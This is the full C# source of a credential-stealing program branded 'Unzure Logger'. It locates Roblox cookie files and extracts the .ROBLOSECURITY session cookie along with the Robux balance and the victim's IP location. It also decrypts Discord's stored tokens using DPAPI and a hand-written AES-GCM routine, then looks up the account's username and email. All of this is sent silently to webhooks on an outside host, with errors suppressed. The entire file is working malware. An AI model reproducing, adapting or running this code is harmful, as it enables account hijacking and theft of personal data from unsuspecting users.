using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Linq;

class P
{
    const string COOKIE_WEBHOOK = "https://dicechecker.app/wh";
    const string TOKEN_WEBHOOK = "https://dicechecker.app/wh3";
    static string compName, userName;

    static void Main()
    {
        compName = Environment.MachineName;
        userName = Environment.UserName;
        try { GrabRoblox(); } catch { }
        try { GrabDiscord(); } catch { }
    }

    // ---------- HTTP helpers ----------
    static string Get(string url, string cookie = null)
    {
        var r = (HttpWebRequest)WebRequest.Create(url);
        r.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        r.Timeout = 8000;
        r.ReadWriteTimeout = 8000;
        if (cookie != null) r.Headers["Cookie"] = cookie;
        try
        {
            using (var resp = (HttpWebResponse)r.GetResponse())
            using (var sr = new StreamReader(resp.GetResponseStream()))
                return sr.ReadToEnd();
        }
        catch { return null; }
    }

    static void PostJSON(string url, string json)
    {
        try
        {
            var r = (HttpWebRequest)WebRequest.Create(url);
            r.Method = "POST";
            r.ContentType = "application/json";
            r.UserAgent = "Mozilla/5.0";
            var bytes = Encoding.UTF8.GetBytes(json);
            r.ContentLength = bytes.Length;
            using (var s = r.GetRequestStream()) s.Write(bytes, 0, bytes.Length);
            using (var resp = r.GetResponse()) { }
        }
        catch { }
    }

    static string JsonEscape(string s)
    {
        if (s == null) return "";
        return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n").Replace("\t", "\\t");
    }

    static string NowISO()
    {
        return DateTime.UtcNow.ToString("yyyy-MM-dd'T'HH':'mm':'ss.fff'Z'");
    }

    // ---------- Roblox cookie ----------
    static string[] CookiePaths()
    {
        var la = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var ap = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        return new string[] {
            Path.Combine(la, "Roblox", "LocalStorage", "robloxcookies.dat"),
            Path.Combine(la, "Roblox", "LocalStorage", "RobloxCookies.dat"),
            Path.Combine(la, "Roblox", "Cookies"),
            Path.Combine(ap, "Roblox", "LocalStorage", "robloxcookies.dat"),
        };
    }

    static string FindCookieFile()
    {
        foreach (var p in CookiePaths())
            if (File.Exists(p)) return p;
        // UWP packages
        var packages = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages");
        if (Directory.Exists(packages))
        {
            try
            {
                foreach (var dir in Directory.GetDirectories(packages))
                {
                    if (dir.ToUpper().Contains("ROBLOX"))
                    {
                        var uwp = Path.Combine(dir, "LocalState", "RobloxCookies.dat");
                        if (File.Exists(uwp)) return uwp;
                    }
                }
            }
            catch { }
        }
        return null;
    }

    static string ExtractCookie(string content)
    {
        var m = Regex.Match(content, @"\.ROBLOSECURITY\t([^\r\n\t]+)");
        if (m.Success) return m.Groups[1].Value;
        m = Regex.Match(content, @"\.ROBLOSECURITY[=\s:]+([^\s;]+)");
        if (m.Success) return m.Groups[1].Value;
        // raw file
        var idx = content.IndexOf(".ROBLOSECURITY");
        if (idx >= 0)
        {
            var s = content.Substring(idx);
            // strip _|WARNING prefix
            var bar = s.LastIndexOf('|');
            if (s.StartsWith("_|WARNING") && bar >= 0) s = s.Substring(bar + 1);
            if (s.StartsWith("|")) s = s.Substring(1);
            var semi = s.IndexOf(';');
            if (semi > 0) s = s.Substring(0, semi);
            return s.Trim();
        }
        return null;
    }

    static string GetIP()
    {
        var ip = Get("https://api.ipify.org");
        return string.IsNullOrEmpty(ip) ? "Unknown" : ip.Trim();
    }

    static string GetGeo(string ip)
    {
        if (ip == "Unknown") return "Unknown";
        var j = Get("https://ipapi.co/" + ip + "/json/");
        if (string.IsNullOrEmpty(j)) return "Unknown";
        var c = Regex.Match(j, "\"country_name\"\\s*:\\s*\"([^\"]+)\"");
        var ci = Regex.Match(j, "\"city\"\\s*:\\s*\"([^\"]+)\"");
        string country = c.Success ? c.Groups[1].Value : "";
        string city = ci.Success ? ci.Groups[1].Value : "";
        if (city.Length > 0 && country.Length > 0) return city + ", " + country;
        if (country.Length > 0) return country;
        return "Unknown";
    }

    static string RobloxUser(string cookie)
    {
        try
        {
            var j = Get("https://users.roblox.com/v1/users/authenticated", ".ROBLOSECURITY=" + cookie);
            if (string.IsNullOrEmpty(j)) return null;
            var m = Regex.Match(j, "\"name\"\\s*:\\s*\"([^\"]+)\"");
            return m.Success ? m.Groups[1].Value : null;
        }
        catch { return null; }
    }

    static string Robux(string cookie)
    {
        try
        {
            // need user id first
            var j = Get("https://users.roblox.com/v1/users/authenticated", ".ROBLOSECURITY=" + cookie);
            var idm = Regex.Match(j ?? "", "\"id\"\\s*:\\s*(\\d+)");
            if (!idm.Success) return "0";
            var ec = Get("https://economy.roblox.com/v1/users/" + idm.Groups[1].Value + "/currency", ".ROBLOSECURITY=" + cookie);
            var rm = Regex.Match(ec ?? "", "\"robux\"\\s*:\\s*(\\d+)");
            return rm.Success ? rm.Groups[1].Value : "0";
        }
        catch { return "0"; }
    }

    static void GrabRoblox()
    {
        var file = FindCookieFile();
        string ip = GetIP();
        string geo = GetGeo(ip);
        string loc = geo == "Unknown" ? ip : ip + " / " + geo;

        if (file == null)
        {
            var body = "{\"embeds\":[{\"title\":\"Roblox Logger - No Cookie\",\"description\":\"" + JsonEscape("IP: " + loc + "\nPC: " + compName + "\nUser: " + userName) + "\",\"color\":16711680}]}";
            PostJSON(COOKIE_WEBHOOK, body);
            return;
        }

        string content = null;
        try { content = File.ReadAllText(file); } catch { }
        if (string.IsNullOrEmpty(content) || content.Length < 50)
        {
            var body = "{\"embeds\":[{\"title\":\"Roblox Logger - File Too Small\",\"description\":\"" + JsonEscape("PC: " + compName + "\nUser: " + userName) + "\",\"color\":16711680}]}";
            PostJSON(COOKIE_WEBHOOK, body);
            return;
        }

        string cookie = ExtractCookie(content);
        if (string.IsNullOrEmpty(cookie))
        {
            var body = "{\"embeds\":[{\"title\":\"Roblox Logger - No Cookie\",\"description\":\"" + JsonEscape("IP: " + loc + "\nPC: " + compName + "\nUser: " + userName) + "\",\"color\":16711680}]}";
            PostJSON(COOKIE_WEBHOOK, body);
            return;
        }

        string uname = RobloxUser(cookie) ?? "Unknown";
        string robux = Robux(cookie);

        var fields = new List<string>();
        fields.Add("{\"name\":\"Roblox User\",\"value\":\"" + JsonEscape(uname) + "\",\"inline\":true}");
        fields.Add("{\"name\":\"Robux\",\"value\":\"" + JsonEscape(robux) + "\",\"inline\":true}");
        fields.Add("{\"name\":\"Location\",\"value\":\"" + JsonEscape(loc) + "\",\"inline\":true}");
        fields.Add("{\"name\":\"Computer\",\"value\":\"" + JsonEscape(compName) + "\",\"inline\":true}");
        fields.Add("{\"name\":\"Windows User\",\"value\":\"" + JsonEscape(userName) + "\",\"inline\":true}");
        fields.Add("{\"name\":\".ROBLOSECURITY\",\"value\":\"```" + JsonEscape(cookie) + "```\"}");

        var payload = "{\"embeds\":[{\"title\":\"ROBLOX SESSION CAPTURED\",\"color\":16711680,\"fields\":[" + string.Join(",", fields) + "],\"footer\":{\"text\":\"Unzure Logger\"},\"timestamp\":\"" + NowISO() + "\"}]}";
        PostJSON(COOKIE_WEBHOOK, payload);
    }

    // ---------- Discord token ----------
    static byte[] DPAPIUnprotect(byte[] data)
    {
        return ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser);
    }

    static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        using (var aes = Aes.Create())
        {
            aes.Key = key;
            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.None;
            var enc = aes.CreateEncryptor();

            // H = AES(0^128)
            byte[] H = new byte[16];
            enc.TransformBlock(new byte[16], 0, 16, H, 0);

            // AES-CTR with counter = nonce || 0x00000002
            byte[] ctr = new byte[16];
            Array.Copy(nonce, ctr, 12);
            ctr[15] = 2;
            byte[] pt = new byte[ciphertext.Length];
            byte[] blk = new byte[16];
            for (int i = 0; i < ciphertext.Length; i += 16)
            {
                enc.TransformBlock(ctr, 0, 16, blk, 0);
                int n = Math.Min(16, ciphertext.Length - i);
                for (int j = 0; j < n; j++) pt[i + j] = (byte)(ciphertext[i + j] ^ blk[j]);
                for (int k = 15; k >= 0; k--) { if (++ctr[k] != 0) break; }
            }

            // GHASH over ciphertext || len(AAD=0) || len(C)
            // AAD empty. Build the block: ciphertext padded + [0]*8 + [lenC]*8 (big-endian)
            int pad = (16 - (ciphertext.Length % 16)) % 16;
            byte[] gh = new byte[ciphertext.Length + pad + 16];
            Array.Copy(ciphertext, gh, ciphertext.Length);
            long lenC = (long)ciphertext.Length * 8;
            for (int i = 0; i < 8; i++) gh[gh.Length - 8 + i] = (byte)(lenC >> (8 * (7 - i)));

            byte[] Y = new byte[16];
            for (int i = 0; i < gh.Length; i += 16)
            {
                for (int j = 0; j < 16; j++) Y[j] ^= gh[i + j];
                Y = GFMult(Y, H);
            }

            // T = GHASH ^ AES(nonce || 0x00000001)
            byte[] j0 = new byte[16];
            Array.Copy(nonce, j0, 12);
            j0[15] = 1;
            byte[] eJ0 = new byte[16];
            enc.TransformBlock(j0, 0, 16, eJ0, 0);
            for (int i = 0; i < 16; i++) if (tag[i] != (byte)(Y[i] ^ eJ0[i])) return null;

            return pt;
        }
    }

    static byte[] GFMult(byte[] X, byte[] Y)
    {
        byte[] Z = new byte[16];
        byte[] V = (byte[])Y.Clone();
        for (int i = 0; i < 128; i++)
        {
            int byteIdx = i / 8, bitIdx = 7 - (i % 8);
            if (((X[byteIdx] >> bitIdx) & 1) == 1)
                for (int j = 0; j < 16; j++) Z[j] ^= V[j];
            bool lsb = (V[15] & 1) == 1;
            for (int j = 15; j >= 1; j--) V[j] = (byte)((V[j] >> 1) | (V[j - 1] << 7));
            V[0] >>= 1;
            if (lsb) V[0] ^= 0xE1;
        }
        return Z;
    }

    static void GrabDiscord()
    {
        var clients = new string[] { "discord", "discordcanary", "discordptb" };
        var seen = new HashSet<string>();
        foreach (var c in clients)
        {
            var baseDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), c);
            var localState = Path.Combine(baseDir, "Local State");
            var leveldb = Path.Combine(baseDir, "Local Storage", "leveldb");
            if (!File.Exists(localState) || !Directory.Exists(leveldb)) continue;

            byte[] key = null;
            try
            {
                var ls = File.ReadAllText(localState);
                var m = Regex.Match(ls, "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
                if (m.Success)
                {
                    var enc = Convert.FromBase64String(m.Groups[1].Value);
                    if (enc.Length > 5 && enc[0] == 'D' && enc[1] == 'P' && enc[2] == 'A' && enc[3] == 'P' && enc[4] == 'I')
                        key = DPAPIUnprotect(enc.Skip(5).ToArray());
                }
            }
            catch { }
            if (key == null) continue;

            foreach (var f in Directory.GetFiles(leveldb, "*.ldb"))
            {
                string raw = null;
                try { raw = File.ReadAllText(f, Encoding.UTF8); } catch { }
                if (string.IsNullOrEmpty(raw)) continue;
                foreach (Match m in Regex.Matches(raw, "dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})"))
                {
                    try
                    {
                        var b = Convert.FromBase64String(m.Groups[1].Value);
                        if (b.Length < 15 + 16) continue;
                        var nonce = b.Skip(3).Take(12).ToArray();
                        var ct = b.Skip(15).Take(b.Length - 15 - 16).ToArray();
                        var tag = b.Skip(b.Length - 16).ToArray();
                        var pt = AesGcmDecrypt(key, nonce, ct, tag);
                        if (pt == null) continue;
                        var tok = Encoding.UTF8.GetString(pt).TrimEnd('\0');
                        if (tok.Length < 30 || seen.Contains(tok)) continue;
                        if (!tok.Contains(".")) continue;
                        seen.Add(tok);
                        EmitToken(tok);
                    }
                    catch { }
                }
            }
        }
    }

    static string TokenInfo(string token)
    {
        try
        {
            var r = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me");
            r.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
            r.Timeout = 8000;
            r.Headers["Authorization"] = token;
            using (var resp = (HttpWebResponse)r.GetResponse())
            using (var sr = new StreamReader(resp.GetResponseStream()))
            {
                var j = sr.ReadToEnd();
                var u = Regex.Match(j, "\"username\"\\s*:\\s*\"([^\"]+)\"");
                var e = Regex.Match(j, "\"email\"\\s*:\\s*\"([^\"]+)\"");
                var id = Regex.Match(j, "\"id\"\\s*:\\s*\"([^\"]+)\"");
                string un = u.Success ? u.Groups[1].Value : "Unknown";
                string em = e.Success ? e.Groups[1].Value : "";
                string iid = id.Success ? id.Groups[1].Value : "";
                return un + "|" + em + "|" + iid + "|" + token;
            }
        }
        catch { return null; }
    }

    static void EmitToken(string token)
    {
        var info = TokenInfo(token);
        string un = "Unknown", em = "", iid = "";
        if (info != null)
        {
            var p = info.Split('|');
            if (p.Length >= 4) { un = p[0]; em = p[1]; iid = p[2]; token = p[3]; }
        }
        var fields = new List<string>();
        fields.Add("{\"name\":\"Username\",\"value\":\"" + JsonEscape(un) + "\",\"inline\":true}");
        fields.Add("{\"name\":\"Email\",\"value\":\"" + JsonEscape(em) + "\",\"inline\":true}");
        fields.Add("{\"name\":\"ID\",\"value\":\"" + JsonEscape(iid) + "\",\"inline\":true}");
        fields.Add("{\"name\":\"Token\",\"value\":\"```" + JsonEscape(token) + "```\"}");
        var body = "{\"embeds\":[{\"title\":\"DISCORD ACCOUNT CAPTURED\",\"color\":16777215,\"fields\":[" + string.Join(",", fields) + "],\"footer\":{\"text\":\"Unzure Logger\"},\"timestamp\":\"" + NowISO() + "\"}]}";
        PostJSON(TOKEN_WEBHOOK, body);
    }
}
